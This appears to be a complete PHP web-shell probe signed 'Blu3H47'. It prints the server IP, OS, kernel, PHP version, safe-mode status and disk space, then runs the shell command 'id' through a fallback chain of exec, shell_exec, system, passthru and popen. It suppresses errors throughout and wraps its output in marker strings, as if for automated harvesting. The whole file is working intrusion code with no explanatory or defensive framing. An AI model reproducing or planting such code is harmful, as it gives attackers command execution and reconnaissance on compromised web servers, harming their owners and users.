?>
<?
$dir = @getcwd();
$ker = @php_uname();
echo "By Blu3H4".(5+2);

$OS = @PHP_OS;
 $IpServer = $_SERVER["SERVER_ADDR"];
 $UNAME = @php_uname();
 $PHPv = @phpversion();
 $SafeMode = @ini_get('safe_mode');

 if ($SafeMode == '') { $SafeMode = "OFF"; }
 else { $SafeMode = "$SafeMode"; }
 
echo "<br> blu3start Server_IP: {$IpServer} __ System:{$OS} __ Uname: {$UNAME} __ PHP: {$PHPv} __ safe mode: {$SafeMode} blu3end";



echo "Blu3H47<br>";

$OS = @PHP_OS;
echo "<br>OSTYPE:$OS<br>";
echo "<br>Kernel:$ker<br>";
$free = disk_free_space($dir); 
if ($free === FALSE) {$free = 0;} 
if ($free < 0) {$free = 0;} 
echo "Free:".view_size($free)."<br>"; 
$cmd="id";
$eseguicmd=ex($cmd);
echo $eseguicmd;
function ex($cfe){
$res = '';
if (!empty($cfe)){
if(function_exists('exec')){
@exec($cfe,$res);
$res = join("\n",$res);
}
elseif(function_exists('shell_exec')){
$res = @shell_exec($cfe);
}
elseif(function_exists('system')){
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(function_exists('passthru')){
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
}
elseif(@is_resource($f = @popen($cfe,"r"))){
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
}}
return $res;
}
function view_size($size) 
{ 
if (!is_numeric($size)) {return FALSE;} 
else 
{ 
if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";} 
elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";} 
elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";} 
else {$size = $size . " B";} 
return $size; 
}
} 


?>
